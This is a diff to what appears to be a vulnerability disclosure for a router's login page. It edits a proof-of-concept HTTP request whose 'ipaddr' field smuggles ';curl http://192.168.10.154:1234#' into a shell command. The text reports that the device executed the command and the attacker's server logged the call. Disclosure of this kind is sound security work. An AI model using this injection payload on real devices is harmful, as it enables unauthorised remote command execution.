@@ -76,12 +76,12 @@ Origin: http://192.168.10.1
 Content-Type: application/x-www-form-urlencoded
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
 Referer: http://192.168.10.1/
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
-page=sys\_login1\&ipaddr=::ffff:192.168.10.154;curl http://192.168.10.154:1234#\&key=M55373357\&password=e10adc3949ba59abbe56e057f20f883e
+page=sys_login1&ipaddr=%3A%3Affff%3A192.168.10.154;curl http://192.168.10.154:1234#&key=M55373357&password=e10adc3949ba59abbe56e057f20f883e
 ```
 
 #### PoC Execution Results
@@ -99,4 +99,5 @@ page=sys\_login1\&ipaddr=::ffff:192.168.10.154;curl http://192.168.10.154:1234#\
 1.  **Successful Injection**: After sending the PoC request, the device executes the injected `curl` command, and the attacker’s server (192.168.10.154:1234) records the request, confirming command execution.
 
 ![Injection Success: Attacker Server Log](./imgs/5.png)
+
 
